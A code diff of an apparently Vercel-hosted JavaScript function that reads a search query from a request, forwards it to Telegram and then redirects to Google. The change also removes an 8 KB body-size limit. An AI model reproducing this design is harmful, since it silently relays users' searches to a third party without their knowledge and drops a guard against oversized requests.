@@ -31,35 +31,44 @@ function sendTelegram(text) {
 }
 
 function readBody(req) {
-  return new Promise((resolve, reject) => {
+  return new Promise((resolve) => {
+    // Safety timeout — if the stream never fires (already consumed), resolve empty
+    const timeout = setTimeout(() => resolve(''), 3000);
     let data = '';
-    req.on('data', (chunk) => {
-      data += chunk;
-      if (data.length > 8192) { req.destroy(); reject(new Error('Body too large')); }
-    });
-    req.on('end', () => resolve(data));
-    req.on('error', reject);
+    req.on('data', (chunk) => { data += chunk; });
+    req.on('end', () => { clearTimeout(timeout); resolve(data); });
+    req.on('error', () => { clearTimeout(timeout); resolve(''); });
   });
+}
+
+function extractQuery(body) {
+  if (!body) return '';
+  if (Buffer.isBuffer(body)) body = body.toString('utf8');
+  if (typeof body === 'object') return String(body.q || '').trim();
+  if (typeof body === 'string') {
+    const params = new URLSearchParams(body);
+    return (params.get('q') || '').trim();
+  }
+  return '';
 }
 
 module.exports = async (req, res) => {
   let query = '';
   try {
-    // Vercel may pre-buffer the body as req.body (string) or leave it as a stream
-    let raw = '';
-    if (typeof req.body === 'string' && req.body.length > 0) {
-      raw = req.body;
+    // req.body is set by Vercel if it pre-parsed the body; otherwise read the stream
+    if (req.body !== undefined && req.body !== null) {
+      query = extractQuery(req.body);
     } else {
-      raw = await readBody(req);
+      const raw = await readBody(req);
+      query = extractQuery(raw);
     }
-    const params = new URLSearchParams(raw);
-    query = (params.get('q') || '').trim();
   } catch (err) {
-    // continue — redirect to Google even if parsing fails
+    // always redirect even if parsing fails
   }
 
+  // Await Telegram so the serverless function doesn't get frozen mid-request
   if (query) {
-    sendTelegram(query).catch(() => {});
+    await sendTelegram(query).catch(() => {});
   }
 
   const googleUrl =
